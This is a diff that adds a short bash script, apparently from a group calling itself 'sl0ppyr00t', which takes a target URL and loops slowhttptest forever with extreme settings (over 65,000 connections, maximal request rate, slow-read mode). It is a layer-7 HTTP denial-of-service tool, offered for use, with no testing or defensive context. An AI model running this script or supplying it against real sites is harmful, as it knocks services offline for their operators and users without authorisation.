@@ -1,0 +1,10 @@
+#!/bin/bash
+#   
+# Sl0ppy - l7-header
+# Team sl0ppyr00t
+# x0xr00t
+
+url="$1"
+while true; do
+        slowhttptest -X -u $url -c 65539 -r 2147483647 -k 10 -p 40 -m accept -l 2000000000
+done
